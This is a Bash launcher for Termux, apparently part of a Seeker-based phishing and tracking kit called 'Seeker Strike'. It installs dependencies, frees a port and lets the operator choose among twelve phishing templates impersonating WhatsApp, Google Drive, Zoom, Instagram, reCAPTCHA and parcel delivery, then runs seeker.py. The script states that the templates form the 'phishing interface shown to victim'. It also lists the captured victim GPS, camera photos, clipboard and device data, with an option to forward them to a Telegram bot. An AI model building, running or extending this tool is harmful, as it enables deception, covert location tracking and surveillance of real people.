#!/data/data/com.termux/files/usr/bin/bash
# Seeker Strike - Termux Launcher
# Auto-install dependencies, start tunnel, then run seeker.py

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo -e "${CYAN}"
echo " ____ _ ____ _ _ _ "
echo " / ___| ___| | _____ _ __ / ___|| |_ _ __(_) | ____ "
echo " \___ \ / _ \ |/ / _ \ '__| \___ \| __| '__| | |/ / _ \\"
echo " ___) | __/ < __/ | ___) | |_| | | | < __/"
echo " |____/ \___|_|\_\___|_| |____/ \__|_| |_|_|\_\___|"
echo -e "${NC}"
echo -e "${GREEN}OSINT + Social Engineering Tracking Tool${NC}"
echo ""

# ---- DEPENDENCY FUNCTIONS ----

check_and_install() {
    local pkg_name=$1
    local cmd_name=$2

    if ! command -v "$cmd_name" &> /dev/null; then
        echo -e "${YELLOW}[!] $pkg_name belum terinstall. Menginstall...${NC}"
        pkg install "$pkg_name" -y
    else
        echo -e "${GREEN}[✓] $pkg_name sudah terinstall${NC}"
    fi
}

install_python_packages() {
    echo -e "${CYAN}[*] Memeriksa Python packages...${NC}"
    python3 -c "import requests" 2>/dev/null || pip install requests
    python3 -c "import packaging" 2>/dev/null || pip install packaging
    python3 -c "import psutil" 2>/dev/null || pkg install python-psutil -y
    echo -e "${GREEN}[✓] Python packages ready${NC}"
}

# ---- KILL PORT FUNCTION ----

kill_port() {
    local port=$1
    echo -e "${CYAN}[*] Checking port $port...${NC}"

    local pid=""
    local kill_attempt=0
    local max_attempts=3

    while [ $kill_attempt -lt $max_attempts ]; do
        pid=""

        if command -v netstat &> /dev/null; then
            pid=$(netstat -tlnp 2>/dev/null | grep ":$port " | awk '{print $7}' | cut -d'/' -f1 | grep -oE '[0-9]+' | head -1 || true)
        fi

        if [ -z "$pid" ] && [ -f /proc/net/tcp ]; then
            local hex_port=$(printf '%04X' $port)
            pid=$(cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | grep ":$hex_port" | awk '{print $8}' | head -1 | cut -d':' -f4 | grep -oE '[0-9]+' || true)
        fi

        if [ -z "$pid" ] && command -v fuser &> /dev/null; then
            pid=$(fuser $port/tcp 2>/dev/null | awk '{print $1}' || true)
        fi

        if [ ! -z "$pid" ] && [ "$pid" != " " ]; then
            echo -e "${YELLOW}[!] Attempt $((kill_attempt+1)): Killing process on port $port (PID: $pid)${NC}"
            for p in $pid; do
                kill -9 $p 2>/dev/null || true
            done
            sleep 2
            kill_attempt=$((kill_attempt+1))
        else
            echo -e "${GREEN}[✓] Port $port is free${NC}"
            return 0
        fi
    done

    if [ $kill_attempt -eq $max_attempts ]; then
        echo -e "${RED}[✗] Failed to free port $port after $max_attempts attempts${NC}"
        echo -e "${YELLOW}[!] You may need to wait a moment or kill the process manually${NC}"
        return 1
    fi
}



# ---- TEMPLATE SELECTION ----
# This must match templates.json order exactly

select_template() {
    echo -e "${CYAN}Pilih template:${NC}"
    echo ""

    # These MUST match templates.json order
    # 0=nearyou, 1=gdrive, 2=whatsapp, 3=whatsapp_redirect, 4=telegram,
    # 5=zoom, 6=captcha, 7=custom_og_tags, 8=instagram, 9=youtube,
    # 10=ecommerce, 11=package
    templates=("nearyou" "gdrive" "whatsapp" "whatsapp_redirect" "telegram" \
               "zoom" "captcha" "custom_og_tags" "instagram" "youtube" \
               "ecommerce" "package")
    template_names=("NearYou" "Google Drive" "WhatsApp" "WhatsApp Redirect" "Telegram" \
                    "Zoom" "Google ReCaptcha" "Custom Link Preview" "Instagram" "YouTube Age Verify" \
                    "E-commerce" "Package Delivery")

    for i in "${!templates[@]}"; do
        echo " [$i] ${template_names[$i]}"
    done
    echo ""
    echo -e "${YELLOW}[*] Template determines the phishing interface shown to victim${NC}"
    echo ""

    read -p "Pilih template [0-11] (default: 0 - NearYou): " template_input
    template_input=${template_input:-0}

    if [[ "$template_input" =~ ^[0-9]+$ ]] && [ "$template_input" -ge 0 ] && [ "$template_input" -le 11 ]; then
        SELECTED_INDEX=$template_input
        SELECTED_TEMPLATE="${templates[$SELECTED_INDEX]}"
    else
        echo -e "${YELLOW}[!] Invalid selection, using default: NearYou${NC}"
        SELECTED_INDEX=0
        SELECTED_TEMPLATE="nearyou"
    fi

    echo -e "${GREEN}[✓] Template: ${template_names[$SELECTED_INDEX]} (index: $SELECTED_INDEX)${NC}"
}

# ---- MAIN ----

echo -e "${CYAN}[*] Memeriksa dependencies...${NC}"
echo ""

check_and_install "python" "python3"
check_and_install "php" "php"
check_and_install "openssh" "ssh"
check_and_install "net-tools" "netstat"
check_and_install "curl" "curl"
install_python_packages

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN} Semua dependencies siap!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""

# Database cleanup prompt
echo -e "${YELLOW}[?] Hapus riwayat database lama?${NC}"
read -p "Hapus database? [y/N] (Biar kga eror: y): " clear_db
if [[ "$clear_db" == "y" || "$clear_db" == "Y" ]]; then
    echo -e "${CYAN}[*] Membersihkan database dan logs...${NC}"
    : > "$SCRIPT_DIR/db/results.csv" 2>/dev/null || true
    echo '[]' > "$SCRIPT_DIR/db/results.json"
    echo 'var seeker_results = [];' > "$SCRIPT_DIR/db/results.js"
    rm -f "$SCRIPT_DIR"/logs/*.info.json "$SCRIPT_DIR"/logs/*.gps.json \
          "$SCRIPT_DIR"/logs/*.camera.json "$SCRIPT_DIR"/logs/*.clipboard.json \
          "$SCRIPT_DIR"/db/captures/*.jpg 2>/dev/null || true
    echo -e "${GREEN}[✓] Database dibersihkan!${NC}"
    sleep 1
fi
echo ""

# Select template
select_template

# Check if .env exists
if [ ! -f ".env" ]; then
    echo -e "${YELLOW}[!] File .env tidak ditemukan. Membuat dari .env.example...${NC}"
    cp .env.example .env
    echo -e "${GREEN}[✓] .env created${NC}"
fi

# Kill any existing process on port 8080
kill_port 8080
sleep 2

# ---- SHOW RESULT INFO ----
echo ""
echo -e "${YELLOW}========================================${NC}"
echo -e "${YELLOW} PETUNJUK HASIL${NC}"
echo -e "${YELLOW}========================================${NC}"
echo -e " ${CYAN}Template:${NC}  $SELECTED_TEMPLATE (index: $SELECTED_INDEX)"
echo ""
echo -e " Hasil tersimpan di:"
echo -e "   ${CYAN}db/results.csv${NC} — Semua data tabular (CSV)"
echo -e "   ${CYAN}db/results.json${NC} — Semua data (JSON)"
echo -e "   ${CYAN}db/captures/${NC} — Foto korban (jika ada)"
echo ""
echo -e " ${YELLOW}[*] Biar realtime tanpa buka dashboard:${NC}"
echo -e "   python3 seeker.py -tg BOT_TOKEN:CHAT_ID"
echo -e "   (Buat bot di @BotFather, cek chat ID di @userinfobot)"
echo -e "${YELLOW}========================================${NC}"
echo ""

# ---- RUN SEEKER.PY ----
# seeker.py handles: template loading, PHP server start, tunnel menu/auto-start
# We pass the template INDEX (0-based) via env var

echo -e "${YELLOW}[*] Starting seeker.py...${NC}"
echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
echo ""

export TEMPLATE="$SELECTED_INDEX"
python3 seeker.py

echo ""
echo -e "${GREEN}[✓] Done${NC}"
